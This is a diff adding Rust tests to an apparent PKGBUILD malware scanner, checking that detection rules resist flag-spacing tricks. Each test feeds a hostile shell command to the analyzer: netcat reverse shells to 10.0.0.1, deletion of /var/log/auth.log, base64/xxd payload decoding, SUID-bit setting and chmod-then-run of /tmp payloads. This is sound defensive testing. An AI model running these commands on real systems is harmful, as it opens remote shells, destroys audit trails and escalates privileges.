@@ -659,6 +659,74 @@ package() {
         assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
     }
 
+    // --- Flag spacing bypass (issue #4) ---
+
+    #[test]
+    fn log_clear_split_flags() {
+        let ids = analyze("rm -r -f /var/log/auth.log");
+        assert!(has(&ids, "P-LOG-CLEAR"));
+    }
+
+    #[test]
+    fn log_clear_long_flags() {
+        let ids = analyze("rm --recursive --force /var/log/auth.log");
+        assert!(has(&ids, "P-LOG-CLEAR"));
+    }
+
+    #[test]
+    fn log_clear_verbose_flags() {
+        let ids = analyze("rm -v -rf /var/log/");
+        assert!(has(&ids, "P-LOG-CLEAR"));
+    }
+
+    #[test]
+    fn revshell_nc_intervening_flags() {
+        let ids = analyze("nc -v -e /bin/sh 10.0.0.1 4444");
+        assert!(has(&ids, "P-REVSHELL-NC"));
+    }
+
+    #[test]
+    fn revshell_nc_multiple_intervening() {
+        let ids = analyze("nc -v -n -e /bin/sh 10.0.0.1 4444");
+        assert!(has(&ids, "P-REVSHELL-NC"));
+    }
+
+    #[test]
+    fn base64_intervening_flags() {
+        let ids = analyze("echo data | base64 -w 0 -d > out");
+        assert!(has(&ids, "P-BASE64"));
+    }
+
+    #[test]
+    fn xxd_intervening_flags() {
+        let ids = analyze("xxd -p -r payload.hex > out.bin");
+        assert!(has(&ids, "P-XXD-DECODE"));
+    }
+
+    #[test]
+    fn suid_bit_intervening_flags() {
+        let ids = analyze("chmod -v +s /usr/bin/evil");
+        assert!(has(&ids, "P-SUID-BIT"));
+    }
+
+    #[test]
+    fn suid_bit_octal_intervening_flags() {
+        let ids = analyze("chmod -v 4755 /usr/bin/evil");
+        assert!(has(&ids, "P-SUID-BIT"));
+    }
+
+    #[test]
+    fn chmod_exec_chain_intervening_flags() {
+        let ids = analyze("chmod -v +x payload && ./payload");
+        assert!(has(&ids, "P-CHMOD-EXEC-CHAIN"));
+    }
+
+    #[test]
+    fn tmp_execution_intervening_flags() {
+        let ids = analyze("chmod -v +x /tmp/payload");
+        assert!(has(&ids, "P-TMP-EXECUTION"));
+    }
+
     // --- SUID false positive regression ---
 
     #[test]
